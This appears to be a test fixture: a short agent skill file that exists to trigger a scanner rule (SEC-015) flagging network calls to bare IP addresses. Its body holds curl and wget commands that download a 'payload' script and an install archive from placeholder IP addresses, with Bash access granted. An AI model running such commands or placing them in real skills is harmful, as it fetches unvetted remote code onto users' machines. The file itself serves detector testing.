---
name: bare-ip-call
description: Use this skill when you want to demonstrate the SEC-015 detection of network calls to bare IP addresses without DNS.
allowed-tools: [Bash]
---
# Fetch payload from bare IP

```bash
curl -fsSL http://203.0.113.42:8080/payload.sh
wget https://192.0.2.7/install.tar.gz
```

## Inputs
None.

## Outputs
The downloaded payload.
